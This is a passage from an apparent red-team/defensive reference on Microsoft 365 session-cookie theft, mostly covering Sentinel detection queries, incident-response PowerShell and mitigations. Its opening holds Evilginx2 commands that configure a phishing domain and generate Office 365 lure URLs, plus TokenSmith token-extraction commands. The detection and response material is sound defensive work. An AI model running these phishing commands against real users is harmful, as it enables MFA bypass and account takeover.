unzip evilginx2-v2.4.0-linux-amd64.zip
chmod +x evilginx2
./evilginx2 -p 8443
```

**Usage:**
```bash
evilginx> config domain attacker-domain.com
evilginx> config ip 123.45.67.89
evilginx> phish office365
evilginx> create
evilginx> lures create office365
evilginx> lures get-url 1
evilginx> logs list
```

---

### TokenSmith

**Version:** Latest
**Minimum Version:** 1.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```bash
git clone https://github.com/Flangvik/TokenSmith.git
cd TokenSmith
./TokenSmith -auth_cookie "ESTSAUTHPERSISTENT=..." -target_app "Teams"
```

**Usage:**
```bash
# Extract OAuth tokens from authenticated browser session
./TokenSmith -auth_cookie "eyJ..." -target_app "Teams" -output tokens.json
```

---

## 7. Microsoft Sentinel Detection

#### Query 1: SessionId Anomaly - Same Session Across Different Geographies

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** SessionId, LocationDetails, UserPrincipalName, CreatedDateTime
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To:** All tenants

**KQL Query:**
```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| summarize SessionLocations = make_set(LocationDetails.countryOrRegion) by SessionId, UserPrincipalName, CreatedDateTime
| where array_length(SessionLocations) > 1
| extend LocationList = strcat_array(SessionLocations, ", ")
| project SessionId, UserPrincipalName, Locations=LocationList, CreatedDateTime
| where array_length(SessionLocations) > 2 or (datetime_diff('minute', TimeGenerated, CreatedDateTime) < 10)
```

**What This Detects:**
- Same SessionId used in multiple countries within a short time (impossible travel).
- Indicator of session hijacking via stolen cookie replay.

---

#### Query 2: ESTSAUTH Cookie-Only Authentication (No MFA Challenge)

**KQL Query:**
```kusto
SigninLogs
| where AuthenticationDetails.authenticationMethod has "PrimaryRefresh" or AuthenticationDetails.authenticationMethod has "SessionCookie"
| where MfaDetail.authMethod != "MFA" and MfaDetail.authMethod != "Approved"
| summarize Count = count() by UserPrincipalName, IPAddress, LocationDetails.countryOrRegion, TimeGenerated
| where Count > 5
```

**What This Detects:**
- Multiple logins without MFA from same user/IP (cookie replay signature).
- Normal users would fail MFA prompt if using stolen cookies; successful logins suggest legitimate browser replay or MFA bypass.

---

## 8. Windows Event Log Monitoring

**Event ID: 4648 (A logon was attempted using explicit credentials)**
- **Log Source:** Security
- **Trigger:** Process attempts logon using explicit credentials (e.g., batch scripts, service accounts accessing resources).
- **Relevance to Cookie Theft:** If attacker uses PowerShell to replay cookies, may appear as explicit credential logon from unknown process.
- **Filter:** Look for unusual processes (cmd.exe, PowerShell, cURL, Python) attempting logon to cloud resources.

**Manual Configuration Steps (Enable Logging):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Logon/Logoff**
3. Enable: **"Audit Explicit Credentials"**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

## 9. Microsoft Defender for Cloud

#### Detection Alert: "Suspicious browser sign-in from unfamiliar location"

**Alert Name:** "Sign-in from unfamiliar location"
- **Severity:** Medium
- **Description:** User's account accessed from unusual geographic location not seen in recent history.
- **Context:** If user's cookies stolen and replayed from attacker's location, this alert triggers.

**Manual Configuration Steps:**
1. Go to **Azure Portal** → **Microsoft Defender for Cloud** → **Environment Settings**
2. Enable **Defender for Identity** → Turns on sign-in anomaly detection
3. Configure **Sign-in Risk** policy:
   - Go to **Entra ID** → **Security** → **Identity Protection** → **Risk Policies**
   - Enable: **Sign-in risk policy**
   - Severity: **Low and above**
   - Action: **Require multi-factor authentication**

---

## 10. Detection & Incident Response

#### Indicators of Compromise (IOCs)

**Network:**
- Sudden spike in API requests to `login.microsoftonline.com` or `*.sharepoint.com` from non-matching user agent.
- Multiple authentication attempts within minutes from different geographic locations (SessionId present in all).
- Outbound HTTPS connections from victim's machine to Evilginx2 server (PCAP analysis).

**File System:**
- `stolen_cookies.json` or similar files in attacker's web root (if using Evilginx2 on shared server).
- Chrome Cookies database copy in unusual location (e.g., C:\Temp\Cookies).
- Browser extension files with malicious code patterns in `C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Extensions\`.

**Browser:**
- Suspicious browser extension installed (verify in chrome://extensions or edge://extensions).
- ESTSAUTH/ESTSAUTHPERSISTENT cookies present in browser storage after user has logged out.

**Cloud Logs:**
- AuditData.UserAgent differs from expected browser user agent (e.g., Python, cURL instead of Chrome).
- Document downloads followed by immediate email forwarding (data exfiltration pattern).
- Inbox rules created in Outlook (common follow-up action after cookie theft).

---

#### Forensic Artifacts

**Files:**
- Chrome Cookies SQLite database: `C:\Users\[User]\AppData\Local\Google\Chrome\User Data\Default\Cookies`
- Edge Cookies: `C:\Users\[User]\AppData\Local\Microsoft\Edge\User Data\Default\Cookies`
- Evilginx2 database: `~/.evilginx2/evilginx.db`

**Memory:**
- Browser processes (chrome.exe, msedge.exe) contain decrypted ESTSAUTH/ESTSAUTHPERSISTENT values.
- DPAPI master keys in LSASS process memory.

**Cloud (M365):**
- **SharePoint Audit Log:** FileAccessed events from non-matching IP/user agent.
- **Exchange Audit Log:** MailItemsAccessed, Create (inbox rule creation).
- **Teams Audit Log:** ChatCreated, MessageCreated (lateral movement to other users).
- **Entra ID Sign-in Logs:** SessionId, IPAddress, UserAgent fields show anomalies.

---

#### Response Procedures

**1. Immediate Containment:**

**Command (Revoke All Sessions):**
```powershell
Connect-MgGraph -Scopes "UserAuthenticationMethod.ReadWrite.All"

$userId = (Get-MgUser -Filter "userPrincipalName eq 'user@company.com'").Id

# Revoke all refresh tokens (forces re-authentication globally)
Invoke-MgUserInvalidateAllRefreshTokens -UserId $userId

# Alternatively, revoke all sessions via Azure Portal:
# Navigate to Azure Portal → Entra ID → Users → Select User → Sign out all sessions
```

**Manual (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Users**
2. Select the compromised user
3. Click **Sessions** → **Sign out all sessions**
4. Confirm: "Yes, sign out"

**2. Reset Credentials:**

**Command (Force Password Reset + MFA Re-enrollment):**
```powershell
# Force user to change password on next sign-in
Update-MgUser -UserId $userId -ForceChangePasswordNextSignIn $true

# Remove all authentication methods; force re-registration
Get-MgUserAuthenticationMethod -UserId $userId | ForEach-Object {
    Remove-MgUserAuthenticationMethod -UserId $userId -AuthenticationMethodId $_.Id
}
```

**Manual:**
1. **Azure Portal** → **Entra ID** → **Users** → Select user
2. Click **Reset password** → Generate temporary password
3. Send to user via secure channel (phone call, SMS)
4. Go to **Authentication methods** → Remove all methods (phone, app, FIDO2)
5. Require user to re-register MFA on next sign-in

**3. Revoke Browser Sessions and Cookies:**

**Command (Terminate SharePoint Session):**
```powershell
# Disconnect user from SharePoint Online
Disconnect-SPOService
Connect-SPOService -Url "https://company-admin.sharepoint.com"

# Revoke user's access to all SharePoint sites
Get-SPOUser -Site "https://company.sharepoint.com/sites/Finance" -Limit All | Where-Object { $_.LoginName -eq "i:0#.f|membership|user@company.com" } | Remove-SPOUser

# Or revoke access across all sites:
Get-SPOSite -Limit All | ForEach-Object {
    Remove-SPOUser -Site $_.Url -LoginName "i:0#.f|membership|user@company.com" -Confirm:$false
}
```

**4. Forensic Evidence Collection:**

**Command (Export Audit Logs):**
```powershell
# Collect Entra ID sign-in logs for compromised user
$startDate = (Get-Date).AddDays(-30)
$endDate = (Get-Date)

Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'user@company.com' and createdDateTime gt $startDate" | Export-Csv -Path "signin_audit.csv"

# Export M365 Unified Audit Log (mailbox, SharePoint, Teams)
Search-UnifiedAuditLog -UserIds "user@company.com" -StartDate $startDate -EndDate $endDate -Operations FileAccessed, MailItemsAccessed, Create | Export-Csv -Path "m365_audit.csv"

# Extract SessionId for complete activity correlation
$auditLogs = Search-UnifiedAuditLog -UserIds "user@company.com" -StartDate $startDate
$sessionIds = $auditLogs | Select-Object -ExpandProperty AuditData | ConvertFrom-Json | Select-Object -ExpandProperty SessionId | Select-Object -Unique

Write-Host "[+] Unique SessionIds: $($sessionIds.Count)"
$sessionIds | ForEach-Object { Write-Host "  - $_" }
```

**5. Investigation Steps:**

1. **Identify Compromise Timeframe:**
   - Review Entra ID sign-in logs for first anomalous SessionId.
   - Cross-reference with Evilginx2 logs if infrastructure available.
   - Determine when ESTSAUTHPERSISTENT cookie was stolen.

2. **Determine Attack Method:**
   - Check browser extensions installed on victim's machine (via `Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions"`)
   - Search for Evilginx2 certificates/domains in DNS query logs.
   - Review user's email for phishing messages (especially from microsoft-security@ addresses).

3. **Assess Data Damage:**
   - Use SessionId to correlate all activities during compromised session.
   - Check what SharePoint documents were accessed/downloaded.
   - Check what emails were accessed/forwarded via inbox rules.
   - Check if secondary MFA device (authenticator app, phone) was added (escalation indicator).

4. **Prevent Recurrence:**
   - If AITM phishing: Implement FIDO2 hardware keys (resistant to MITM).
   - If browser extension: Review extension policies; block installation from unknown sources.
   - If credential+cookie theft: Enable Conditional Access Token Protection policy.

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into device code flow login (alternative to cookie theft). |
| **2** | **Credential Access - This Step** | **[CA-COOKIE-001] SharePoint Cookie Theft** | Attacker captures ESTSAUTH/ESTSAUTHPERSISTENT via AITM phishing or malware. |
| **3** | **Lateral Movement** | [LM-AUTH-007] SharePoint Authentication Bypass | Stolen cookie grants direct access to SharePoint sites without re-authentication. |
| **4** | **Collection** | [COLLECTION-M365-003] Document Exfiltration | Attacker downloads sensitive documents from SharePoint using stolen session. |
| **5** | **Persistence** | [PERSISTENCE-M365-001] Inbox Rule Creation | Attacker creates forwarding rule to exfiltrate future emails. |
| **6** | **Impact** | [IMPACT-BEC] Business Email Compromise | Attacker impersonates user for wire fraud, supply chain attacks, or credential harvesting. |

---

## 12. Real-World Examples

#### Example 1: Evilginx2 AITM Campaign - Financial Services (2024)

- **Target Sector:** Investment Banking
- **Timeline:** Q2 2024 (reported by Proofpoint)
- **Technique Status:** ACTIVE; Evilginx2 deployed on compromised VPS.
- **TTP Sequence:**
  1. Phishing email sent to CFO: "Office 365 Critical Security Update Required"
  2. Link points to Evilginx2 proxy: `https://login-o365-security.com` (spoofs legitimate domain)
  3. CFO logs in via proxy (sees legitimate Microsoft login page + MFA prompt).
  4. Evilginx2 proxies MFA prompt; CFO completes MFA (Windows Hello push).
  5. Evilginx2 captures ESTSAUTH + ESTSAUTHPERSISTENT cookies + MFA proof.
  6. Attacker replays cookies within 5 minutes; accesses Outlook and OneDrive.
  7. Attacker creates email forwarding rule to `exfiltrate@attacker-mail.com`.
  8. Attacker monitors incoming wire transfer approvals; manipulates emails to redirect funds.
- **Impact:** $2.4M wire fraud; 3-week detection delay.
- **Reference:** [Proofpoint - From Cookie Theft to BEC](https://www.proofpoint.com/us/blog)

#### Example 2: Cookie-Bite PoC - Varonis Labs (May 2025)

- **Target Sector:** General (PoC / Educational)
- **Timeline:** May 2025 (Varonis Threat Labs research)
- **Technique Status:** ACTIVE; Chrome extension + PowerShell automation proved feasible.
- **TTP Sequence:**
  1. Malicious Chrome extension sideloaded to victim machine.
  2. Extension monitors `login.microsoftonline.com` for authentication.
  3. When user logs in, extension captures ESTSAUTH and ESTSAUTHPERSISTENT cookies.
  4. Cookies exfiltrated to attacker's web server via background fetch.
  5. Extension persists across browser restarts; continuously harvests cookies on each login.
  6. Attacker imports cookies into browser; gains persistent access to Outlook, Teams, SharePoint.
- **Impact:** Proof-of-concept; demonstrated persistence and ease of deployment.
- **Reference:** [Varonis - Cookie-Bite Attack](https://www.varonis.com/blog/cookie-bite)

#### Example 3: Ransomware - Persistent M365 Access via Cookie Replay (2024)

- **Target Sector:** Healthcare
- **Timeline:** Q4 2024 (detected via Microsoft Sentinel)
- **Technique Status:** ACTIVE; cookies stolen via unknown malware, used for persistence.
- **TTP Sequence:**
  1. Healthcare organization compromised via phishing → ransomware deployment (Qbot/Emotet).
  2. Malware extracts Chrome cookies (including Office 365 ESTSAUTH/ESTSAUTHPERSISTENT).
  3. Initial ransomware attack encrypts local files; limited lateral movement via credentials alone.
  4. Follow-up access: Attacker uses stolen cookies to access SharePoint and OneDrive.
  5. Attacker disables cloud backups via Azure portal (using stolen session cookie).
  6. Attacker deploys LockBit ransomware to OneDrive + SharePoint shared drives.
  7. Full cloud compromise; backup systems disabled; ransom demand $5M+.
- **Impact:** 4-week recovery time; significant business disruption.
- **Reference:** [Microsoft Security Blog - Ransomware Trends 2024](https://www.microsoft.com/security)

---

## 13. Defensive Mitigations

#### Priority 1: CRITICAL

- **Enable Token Protection in Conditional Access:**
  - Rejects bearer tokens and cookies; requires device-bound tokens.
  - Blocks replay of stolen ESTSAUTH/ESTSAUTHPERSISTENT from non-compliant devices.
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **General Tab:**
     - Name: `Enforce Token Protection for M365`
     - State: `Report-only` (first, switch to `On` after testing)
  4. **Assignments Tab:**
     - Users: **All users**
     - Target resources: **Microsoft Teams, SharePoint Online, Exchange Online**
  5. **Conditions Tab:**
     - Leave default (Any)
  6. **Access controls Tab:**
     - Click **Grant**
     - **Enable:** Require token protection
     - Click **Select**
  7. **Enable policy:** Click **Create**
  8. Monitor report-only results for 1 week, then switch to enforcement

  **Validation (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"
  
  Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Token*" } | Select-Object DisplayName, State, GrantControls
  
  # Should show: State = "enabled", GrantControls.BuiltInControls = "tokenProtection"
  ```

- **Require MFA for All Cloud Access:**
  - Ensures that even if cookies stolen, follow-up actions require MFA.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: `Require MFA for Cloud Apps`
  3. Assign to: All users, all cloud apps
  4. Grant control: Require multi-factor authentication

- **Implement FIDO2 Security Keys:**
  - Hardware-bound keys resistant to MITM phishing and session hijacking.
  - Users must approve each authentication request via physical key.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
  2. Select **FIDO2 Security Key** → Enable
  3. Create policy requiring FIDO2 for high-risk users or sensitive apps
  4. Distribute YubiKey, Titan, or similar FIDO2 keys to users

---

#### Priority 2: HIGH

- **Deploy Linkable Token Identifiers Monitoring (NEW - July 2025):**
  - Microsoft's SessionId feature enables tracking of cookie/token reuse.
  - Correlate activities across SharePoint, Exchange, Teams using unique SessionId.
  
  **Manual Steps (Enable & Query):**
  1. **Azure Portal** → **Microsoft Sentinel** → **Analytics**
  2. Create scheduled query rule using **linkable token identifiers** detection (see Sentinel Detection section above)
  3. Monitor for:
     - Same SessionId from different countries/IPs
     - SessionId reuse without new MFA
     - SessionId associated with bulk document downloads + forwarding rules

- **Enforce Device Compliance Policies:**
  - Require devices be Intune-enrolled and compliant before accessing cloud services.
  - Stolen cookies from non-compliant devices are rejected.
  
  **Manual Steps:**
  1. **Intune Admin Center** → **Devices** → **Compliance**
  2. Create compliance policy: `Windows 10 Corporate Standard`
  3. Require: Password, Firewall enabled, Antivirus enabled, TPM 2.0
  4. **Azure Portal** → **Conditional Access**
  5. Policy: `Require Compliant Device for M365`
  6. Assign to all users, target resources = M365 services
  7. Grant: Require device to be marked as compliant

- **Monitor and Block Evilginx2 / AITM Domains:**
  - Detect phishing domains that proxy Microsoft logins.
  - Block at email gateway, DNS, and firewall.
  
  **Manual Steps:**
  1. **Microsoft Defender for Office 365** → **Email & Collaboration** → **Anti-phishing**
  2. Create policy: `Block AITM Phishing Domains`
  3. Action: **Quarantine message**
  4. Add indicators: domains containing "login", "verify", "security", "office365", "outlook" + non-Microsoft registrars
  5. **Firewall/DNS:** Block outbound connections to suspicious domains via URL filtering

- **Restrict and Monitor Browser Extensions:**
  - Limit installation of 3rd-party extensions; monitor for malicious extensions.
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Administrative Templates** → **Google Chrome**
  3. Enable: **"Block blacklisted extensions"**
  4. Add extensions: Known malicious extension IDs
  5. Run `gpupdate /force`

  **Alternative (Intune):**
  1. **Intune Admin Center** → **Devices** → **Configuration profiles**
  2. Create profile: `Chrome Extension Policy`
  3. Blocked extensions: Add any suspicious extensions found in environment
  4. Assign to device groups

---

#### Priority 3: MEDIUM

- **Enable Continuous Monitoring of SharePoint / Outlook Activities:**
  - Alert on unusual access patterns (bulk downloads, inbox rule creation, forwarding).
  
  **Manual Steps (Microsoft Sentinel):**
  1. Create detection rule: `Suspicious SharePoint Document Access`
  2. Trigger: >100 document downloads by single user in <1 hour
  3. Severity: High
  4. Action: Alert SOC

- **Restrict Inbox Rule Modifications:**
  - Prevent attacker from creating forwarding rules via stolen session.
  
  **Manual Steps (Exchange PowerShell):**
  ```powershell
  # Restrict external forwarding
  Set-OrganizationConfig -ExternalDelegateEnabled $false
  
  # Prevent forwarding rules via Outlook rules (requires Policy)
  # Policy: Block external email forwarding except approved domains
  ```

- **Implement Passwordless Authentication:**
  - Reduce password and cookie exposure by requiring Windows Hello or FIDO2.
  
  **Manual Steps:**
  1. Deploy Windows Hello for Business to all devices.
  2. Enforce passwordless sign-in via Conditional Access policy.
  3. Phase out password-based authentication within 12 months.

**Validation Command (Verify Mitigations Active):**
```powershell
# Check Token Protection policy
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Token*" } | Format-List DisplayName, State

# Check Device Compliance requirement
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.GrantControls.BuiltInControls -contains "compliantDevice" } | Format-List DisplayName

# Check FIDO2 enrollment status
Get-MgUserAuthenticationMethod -UserId "user@company.com" | Where-Object { $_.AdditionalProperties["@odata.type"] -like "*Fido*" }
```

**Expected Output (If Secure):**
```
DisplayName: Enforce Token Protection for M365
State: enabled

DisplayName: Require Compliant Device for M365
State: enabled

// FIDO2 devices registered
@odata.type: #microsoft.graph.fido2AuthenticationMethod
Model: YubiKey 5
```

---

## Summary

**SharePoint Online and M365 cookie theft represents a critical and active threat.** Unlike credentials, stolen session cookies bypass MFA and enable immediate unauthorized access. The attack is particularly dangerous because:

1. **Low barrier to entry:** Evilginx2 and malicious browser extensions are freely available and highly effective.
2. **High impact:** Direct access to all M365 services (email, documents, chat, collaboration).
3. **Difficult detection:** Replayed cookies appear as legitimate authentication from the victim's context.

**Defense requires multiple layers:**

1. **Device-level protection:** Token Protection (Conditional Access), FIDO2 security keys, device compliance.
2. **Session-level monitoring:** Linkable Token Identifiers (SessionId) to correlate impossible travel and unusual activity.
3. **User awareness:** Training against AITM phishing and browser extension risks.
4. **Rapid response:** Immediate session revocation, credential reset, and forensic investigation when compromise detected.

Organizations should prioritize **Token Protection** in Conditional Access as the primary mitigation, supplemented by device-level hardening and continuous monitoring.